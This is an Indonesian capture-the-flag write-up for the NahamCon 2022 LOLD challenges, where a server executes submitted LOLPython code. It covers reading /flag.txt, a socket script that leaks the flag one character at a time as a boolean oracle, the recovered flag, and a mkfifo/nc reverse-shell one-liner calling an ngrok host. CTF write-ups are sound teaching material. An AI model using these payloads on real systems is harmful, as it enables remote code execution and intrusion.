# LOLD
#easy #medium #hard #python

## Target
Source code: [lolpython](lolpython.md)

Untuk menyelesaikan tantangan ini, kita (lagi-lagi) perlu membaca [dokumentasi](https://github.com/KartikTalwar/LOLPython/blob/master/LOLPython.py) software.

Di dalam dokumentasi tersebut terdapat contoh penggunaan untuk menghitung deret bilangan fibonacci:
```python
from datetime import date as DATE 

def FIBBING ( N ) :
    'ITERATE FIBONACCI TERMS LESS THAN N' 
    assert N >= 0 
    # BTW, FIBONACCI LIKE BUNNIES! LOL
    yield 1 
    yield 1 
    I = 1 
    HE = 1 
    while 1:
	I , HE = HE , I + HE 
	if HE >= N :
	    break 
	yield HE 

if __name__ == '__main__' :
    print >>_lol_sys.stderr, 'NOW IZ' , DATE . today ()
    if len(_lol_sys.argv) == 1 :
	N = 100 
    else :
	N = int(_lol_sys.argv[ 1 ]) 
    for I in FIBBING ( N ) :
	print I 
```

```python
IN MAI datetime GIMME date LIKE DATE

SO IM LIKE FIBBING WIT N OK?
    LOL ITERATE FIBONACCI TERMS LESS THAN N /LOL
    SO GOOD N BIG LIKE EASTERBUNNY
    BTW, FIBONACCI LIKE BUNNIES! LOL
    U BORROW CHEEZBURGER
    U BORROW CHEEZBURGER
    I CAN HAZ CHEEZBURGER
    HE CAN HAZ CHEEZBURGER
    WHILE I CUTE?
	I AND HE CAN HAZ HE AND I ALONG WITH HE
	IZ HE BIG LIKE N?
	    KTHXBYE
	U BORROW HE

IZ __name__ KINDA LIKE "__main__"?
    COMPLAIN "NOW IZ" AND DATE OWN today THING
    IZ BIGNESS ARGZ OK KINDA LIKE 1?
	N CAN HAS 100
    NOPE?
	N CAN HAS NUMBR ARGZ LOOK AT 1!!
    GIMME EACH I IN UR FIBBING WIT N OK?
	VISIBLE I
```

## LOLD
HAI!!!! WE HAZ THE BESTEST LOLPYTHON INTERPRETERERERER U HAS EVER SEEEEEN! YOU GIVE SCRIPT, WE RUN SCRIPT!! AND FLAG IS EVEN AT `/flag.txt`.

- Percobaan gagal running script di lolpython
![](attachments/Pasted%20image%2020220505135001.png)

- Percobaan berhasil running script `print("abc")` di lolpython
![](attachments/Pasted%20image%2020220505135043.png)

- Kita mengetahui bahwa lokasi flag ada di /flag.txt, kita bisa membuat oneliner python:
```python
with open('/flag.txt') as BALD: print (BALD.read())
```

- Secara manual, kita convert code tersebut menggunakan syntax lolpython.
```python
WIF open WIT "/flag.txt" ! LIKE BALD?    VISIBLE WIT BALD OWN read THING !
```

- Untuk mengetes kebenarannya, bisa dicoba secara local terlebih dahulu atau menggunakan `--convert`
```sh
python2 lolpython.py testfile # untuk mencoba menjalankan

python2 lolpython.py testfile --convert # untuk mencoba convert
```

- Dicoba
![](attachments/Pasted%20image%2020220505134904.png)

## LOLD2
HAI!!!! WE HAZ THE BESTEST LOLPYTHON INTERPRETERERERER U HAS EVER SEEEEEN! AND WE HAZ MADE SUM UPGRADEZ! YOU GIVE SCRIPT, WE RUN SCRIPT!! AND WE SAY YAY! AND FLAG IS EVEN AT `/flag.txt`!

- Percobaan running script di Python
![](attachments/Pasted%20image%2020220505141308.png)
![](attachments/Pasted%20image%2020220505141326.png)

- Ternyata, apabila berhasil, output yang dikeluarkan adalah `I RAN IT HURRAYYYY!!!`. Kita bisa membuat one liner python untuk menanyakan pertanyaan benar dan salah.
```python
# menanyakan apakah huruf pertama adalah f
with open("/flag.txt") as BALD :   print("WAKAKA")  if BALD . read()[0] == "f" else WAKAKA
```

- Convert ke versi lolpython
```python
WIF open WIT "/flag.txt" ! LIKE BALD?    VISIBLE WIT "WAKAKA" ! IZ BALD OWN read THING LET THE  EASTERBUNNY OK KINDA LIKE "f" NOPE WAKAKA
```

- Jika benar
![](attachments/Pasted%20image%2020220505141824.png)

- Coba kita tanyakan apakah huruf pertama adalah c
```python
# menanyakan apakah huruf pertama adalah c
with open("/flag.txt") as BALD :   print("WAKAKA")  if BALD . read()[0] == "c" else WAKAKA

# versi lolpython
WIF open WIT "/flag.txt" ! LIKE BALD?    VISIBLE WIT "WAKAKA" ! IZ BALD OWN read THING LET THE  EASTERBUNNY OK KINDA LIKE "c" NOPE WAKAKA
```

- Jika salah
![](attachments/Pasted%20image%2020220505142215.png)

- Kita mengetahui jawaban benar dan salahnya, kemudian format flag adalah `flag{md5}`. Kita bisa buat script untuk menanyakan karakter satu persatu.
```python
#!/usr/bin/env python3

import socket;
import time;

# nc challenge.nahamcon.com 32341
flag_backup = 'flag{da682dec4bbcad7437bbb875266fda51}'
flag = ''
hostname = "challenge.nahamcon.com"
port = 32341

def netcat(hostname, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    data = s.recv(4096)
    data = s.recv(4096)
    time.sleep(0.5)
    s.sendall(content.encode())
    data = s.recv(4096)
    # print(repr(data.decode()))
    return repr(data.decode())

payloads = [
"f","l","a","g","{",
"0",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
"a",
"b",
"c",
"d",
"e",
"f",
"error"
]

for i in range (0, 100) :
    content = 'WIF open WIT "/flag.txt" ! LIKE BALD?    VISIBLE WIT "wakak" ! IZ BALD OWN read THING LET THE ' + str(i) +  ' OK KINDA LIKE "}" NOPE WAKAKA'
    if netcat(hostname, port, content)[1] != 'E':
        flag += '}'
        break
    else: 
        for payload in payloads :
            # print(payload)
            content = f'WIF open WIT "/flag.txt" ! LIKE BALD?    VISIBLE WIT "wakak" ! IZ BALD OWN read THING LET THE {i} OK KINDA LIKE "{payload}" NOPE WAKAKA'
            # print(content)
            if netcat(hostname, port, content)[1] != 'E':
                flag += payload
                print(flag)
                break
            if payload == "error":
                print(flag)
                raise Exception

print(flag)
```

- Jalankan
![](attachments/Pasted%20image%2020220505143336.png)

## LOLD2, cara lebih mudah
Saat menyelesaikan CTF, kita tidak gunakan ini. Kirain hanya bisa masukin one liner python aja :)

- lolpython untuk reverse shell
```python3
GIMME os
os OWN system WIT "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 2.tcp.ngrok.io 19742 >/tmp/f" OK
```

- Set up netcat listener
```sh
nc -lnvp 4444
```

- Eksekusi di remote machine
```python
cat lol-reverse | nc challenge.nahamcon.com 32659
```

![](attachments/Pasted%20image%2020220505144119.png)

## LOLD3
HAI!!!! WE HAZ THE BESTEST LOLPYTHON INTERPRETERERERER U HAS EVER SEEEEEN! AND WE HAZ MADE SUM UPGRADEZ! YOU GIVE SCRIPT, WE RUN SCRIPT!! AND WE SAY YAY! BUT URGHHHH NOW WE HAVE LOST THE FLAG!?! YOU HAZ TO FIND IT!!

- Dengan cara LOLD2 di atas untuk membentuk reverse shell, sekarang kita bisa cari flagnya dengan `find`
![](attachments/Pasted%20image%2020220505144450.png)

## Source
https://jorianwoltjer.com/blog/post/ctf/nahamcon-ctf-2022/lold
